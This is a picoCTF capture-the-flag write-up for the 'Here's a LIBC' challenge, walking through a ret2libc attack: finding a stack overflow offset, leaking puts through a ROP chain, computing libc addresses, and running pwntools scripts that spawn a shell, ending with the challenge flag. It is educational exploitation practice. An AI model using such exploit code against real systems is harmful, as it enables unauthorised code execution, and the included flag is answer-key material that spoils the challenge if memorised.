# Here's a LIBC
> Write-up author: jon-brandy
## DESCRIPTION:
I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 42072
## HINT:
1. PWNTools has a lot of useful features for getting offsets.
## STEPS:
1. Given a 64 bit binary file and the libc library.

![image](https://user-images.githubusercontent.com/70703371/223358966-7cf60cff-0c08-494c-9a00-5fdfd1d75206.png)


![image](https://user-images.githubusercontent.com/70703371/223359029-ea4e1434-370b-493f-bb2f-0e63350e8406.png)


2. Let's check it's protections then.

> VULN -> Partial RELRO, No Canary Found, No PIE.

![image](https://user-images.githubusercontent.com/70703371/223359201-b7035a95-3529-41ac-bc63-131855069c46.png)


3. Based from the challenge's title and the protections it has, we shall do **ret2libc attack**.
4. Let's make the binary executeable first then run it.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/223359504-53a443d5-44e2-4466-ac0f-8a5c0463ff2b.png)


5. Seems like we need to patch the binary in order to run it.
6. Luckily there's a tool named **pwninit** to patch the binary.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/223360625-16e97db6-3196-47b3-9e8f-94a2cafc3b3f.png)


![image](https://user-images.githubusercontent.com/70703371/223360687-0f801324-3df4-4a6c-a3d5-a100b73ac2ba.png)


7. Great! Now we have the patched binary file.
8. Let's try to run it now.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/223360953-abb6a2d8-9867-47c1-9054-00416d156b38.png)


9. It keeps prompt us an input.
10. Let's decompile the binary.

> vuln found at do_stuff() function

![image](https://user-images.githubusercontent.com/70703371/223361583-1f99a958-75ab-4249-a896-8cb08c2bdda3.png)


![image](https://user-images.githubusercontent.com/70703371/223361797-c73bf01b-50a9-4d3b-b59c-557e86f74a0e.png)


11. No filter for the `local_88` variable's scanf, means we can overflow the buffer here and control the **RIP**.
12. And for the `local_89` nothing special.

![image](https://user-images.githubusercontent.com/70703371/223362107-931e9354-4ede-4214-84e6-d9ec34125633.png)


13. The loop also won't be our interest here, because it just convert the case of our input.

![image](https://user-images.githubusercontent.com/70703371/223362543-2f610585-1702-4a6d-a624-27cd386337ef.png)


14. Notice we can leak the **libc runtime** using the puts call.

![image](https://user-images.githubusercontent.com/70703371/223362671-b762ae20-1b9b-42fc-a2c0-8c8f4deaf1d9.png)


15. Anyway let's get the **RIP** offset first.

> ENTER CYCLIC 1024 PATTERN

![image](https://user-images.githubusercontent.com/70703371/223362959-fa30a12b-9a39-470d-8838-58e08f5d60ca.png)


> USE THE LEAKED RSP BYTES 

![image](https://user-images.githubusercontent.com/70703371/223363070-91428397-976f-4cf5-9a19-d512620498d6.png)


16. Hence we need to enter 136 bytes as the padding.
17. Since we want to leak the **libc runtime** using the puts function, we have to make a **ROP** exploit where the `puts()` function shall call the puts. -> `puts(puts)`.
18. With this, the program shall printed out the address where `puts` is loaded inside the libc.
19. To do this we need `pop rdi` gadget, `puts@plt` offset and `puts@got` offset. We can automate the search with **pwntools**, but i prefered to do it manually.

> GET THE RDI -> 0x0000000000400913

![image](https://user-images.githubusercontent.com/70703371/223365336-cab343e4-20c4-49b7-878d-21fa116a1fd4.png)


> GET THE PUTS@PLT -> 0x400540

![image](https://user-images.githubusercontent.com/70703371/223365541-830ca543-3b8e-480d-b7ef-90f9bcc64b46.png)


> GET THE PUTS@GOT (USING PWNTOOLS) FOR THIS -> 0x601018

![image](https://user-images.githubusercontent.com/70703371/223365888-9c017687-ff5d-436c-9f4c-2790f19080f4.png)


20. To summarize, the payloads we need to send are:

```
padding (RIP offset),
pop_rdi,
puts_got,
puts_plt
```

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './vuln_patched'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

lib = './libc.so.6'
libc = context.binary = ELF(lib, checksec=False)

sh = start()

offsetRsp = 136 # padding to RIP

puts_got = elf.got['puts']
info('Puts Got: %#0x', puts_got)

pop_rdi_gadget = 0x0000000000400913
info('RDI: %#0x', pop_rdi_gadget)

puts_plt = elf.plt['puts']
info('Puts PLT: %#0x', puts_plt)

p = flat([
    asm('nop')*offsetRsp,
    pop_rdi_gadget,
    puts_got,
    puts_plt
])

sh.sendline(p)


sh.interactive()

```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/223367650-dcbef323-3448-411c-a31a-bd9a56896d18.png)


21. Got 3 results.
22. Notice we got the leaked **libc runtime** address at the 3rd line, let's grab that then using **pwntools**.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/223368340-4fca4e72-2e38-4c4c-85e1-594d3ef86cf5.png)


23. Now we can calculate the libc_base address.

```
libc_base = leaked_puts - libcPuts
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/223368965-5de76ad6-5b5f-4f42-9812-f1810c179220.png)


24. To get the shell we need calculate the correct **/bin/sh** and **system** address.

```
bin_sh = libc_base + libc_binsh
```

```
system = libc_base + libc_system
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/223372671-9a0bfce9-96bd-4a83-b289-9c5b1c4d1b13.png)


25. With this we have all the requirements we need, just have to craft the exploit.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './vuln_patched'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

lib = './libc.so.6'
libc = context.binary = ELF(lib, checksec=False)

sh = start()

offsetRsp = 136 # padding to RIP

puts_got = elf.got['puts'] # get the puts@got address
info('Puts Got: %#0x', puts_got)

pop_rdi_gadget = 0x0000000000400913 # get the pop rdi address
info('RDI: %#0x', pop_rdi_gadget)

puts_plt = elf.plt['puts'] # get the puts@plt address
info('Puts PLT: %#0x', puts_plt)

#1st payload -> to leak teh libc run time

p = flat([
    asm('nop')*offsetRsp,
    pop_rdi_gadget,
    puts_got,
    puts_plt,
])

sh.sendline(p)

## GET THE LEAKED LIBC ADDRESS

sh.recvline()
sh.recvline()
leaked_libc_runtime = int.from_bytes(sh.recvline(keepends=False), byteorder='little')
info('Leaked libc run time: %#0x', leaked_libc_runtime)

## Calculate the base address
libc_base = leaked_libc_runtime - libc.sym['puts']
info('libc_base: %#0x', libc_base)

## Calculate the binsh address
not_calculated_binsh = next(libc.search(b'/bin/sh\x00'))
info('not Calculated libc binsh: %#0x', not_calculated_binsh)

bin_sh = libc_base + not_calculated_binsh
info('libc /bin/sh address: %#0x', bin_sh)

## Calculate the system address
system_address = libc_base + libc.sym['system']
info('libc system address: %#0x', system_address)

## 2nd payload

pay = flat([
    asm('nop')*offsetRsp,
    pop_rdi_gadget,
    puts_got,
    puts_plt,
    pop_rdi_gadget,
    bin_sh,
    system_address
]) 

sh.sendline(pay)

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/223373150-a827bbfb-4379-4d21-bc41-1e384571ecdf.png)


26. The program crashed, after analyzing my script, found the problem is at the 1st payload.
27. We need to add 1 more payload, for this solution i used `do_stuff()` address, it shall do the loops to forbid the binary crashed. But you can make it return to the `main()` function if you want to. It gave me the same result.

> THE SCRIPT (FINAL)

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './vuln_patched'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

lib = './libc.so.6'
libc = context.binary = ELF(lib, checksec=False)

sh = start()

offsetRsp = 136 # padding to RIP

puts_got = elf.got['puts'] # get the puts@got address
info('Puts Got: %#0x', puts_got)

pop_rdi_gadget = 0x0000000000400913 # get the pop rdi address
info('RDI: %#0x', pop_rdi_gadget)

puts_plt = elf.plt['puts'] # get the puts@plt address
info('Puts PLT: %#0x', puts_plt)

#1st payload -> to leak teh libc run time

p = flat([
    asm('nop')*offsetRsp,
    pop_rdi_gadget,
    puts_got,
    puts_plt,
    elf.sym['do_stuff']
])

sh.sendline(p)

## GET THE LEAKED LIBC ADDRESS

sh.recvline()
sh.recvline()
leaked_libc_runtime = int.from_bytes(sh.recvline(keepends=False), byteorder='little')
info('Leaked libc run time: %#0x', leaked_libc_runtime)

## Calculate the base address
libc_base = leaked_libc_runtime - libc.sym['puts']
info('libc_base: %#0x', libc_base)

## Calculate the binsh address
not_calculated_binsh = next(libc.search(b'/bin/sh\x00'))
info('not Calculated libc binsh: %#0x', not_calculated_binsh)

bin_sh = libc_base + not_calculated_binsh
info('libc /bin/sh address: %#0x', bin_sh)

## Calculate the system address
system_address = libc_base + libc.sym['system']
info('libc system address: %#0x', system_address)

## 2nd payload

pay = flat([
    asm('nop')*offsetRsp,
    pop_rdi_gadget,
    puts_got,
    puts_plt,
    pop_rdi_gadget,
    bin_sh,
    system_address
]) 

sh.sendline(pay)

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/223374038-ec1fd50c-2406-444e-bc2a-a08b506241f7.png)


28. Got EOF here, dunno why it failed locally even though i grab the correct(?) address and fill all the exploit requirements.

![image](https://user-images.githubusercontent.com/70703371/223374437-015a2c7b-b2be-4d72-8a8a-e2adeb8cf925.png)


29. I tried to run it remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/223374591-72b28d9a-314a-4cf8-9317-841cef49f3ed.png)


30. We got a shell!

![image](https://user-images.githubusercontent.com/70703371/223374712-d82cb186-c7e6-4949-a7d6-2dfe08a3b03e.png)


![image](https://user-images.githubusercontent.com/70703371/223374763-c91bdb01-9a8c-4138-8cc3-6724769259c8.png)


31. Got the flag!

## FLAG

```
picoCTF{1_<3_sm4sh_st4cking_3a9ee516616d21b3}
```





